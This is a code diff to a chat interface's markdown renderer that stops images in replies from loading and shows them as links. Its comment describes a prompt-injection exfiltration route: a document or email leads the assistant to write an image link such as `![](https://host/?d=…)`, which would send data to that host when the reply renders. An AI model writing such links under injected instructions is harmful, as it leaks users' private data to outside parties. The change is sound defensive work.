@@ -75,6 +75,22 @@ function MarkdownLink({ href, children }: ComponentProps<"a">) {
   );
 }
 
+/**
+ * An image in a reply is never loaded. The browser fetches an image the
+ * moment it renders, without a click, so a reply that a document or an email
+ * talked into writing `![](https://host/?d=…)` would send whatever it put in
+ * the address to that host as soon as the reply was read. It is shown as a
+ * link to open deliberately, and only its words are drawn.
+ */
+function MarkdownImage({ src, alt }: ComponentProps<"img">) {
+  const label = alt?.trim() || "image";
+  if (typeof src !== "string" || src === "") {
+    return <span>{label}</span>;
+  }
+
+  return <MarkdownLink href={src}>{label}</MarkdownLink>;
+}
+
 const components: Components = {
   p: ({ children }) => <p className="my-1.5 leading-relaxed first:mt-0 last:mb-0">{children}</p>,
   h1: ({ children }) => (
@@ -91,6 +107,7 @@ const components: Components = {
   strong: ({ children }) => <strong className="font-semibold">{children}</strong>,
   em: ({ children }) => <em>{children}</em>,
   a: ({ href, children }) => <MarkdownLink href={href}>{children}</MarkdownLink>,
+  img: ({ src, alt }) => <MarkdownImage src={src} alt={alt} />,
   blockquote: ({ children }) => (
     <blockquote className="border-border text-muted-foreground my-2 border-l-2 pl-3">
       {children}
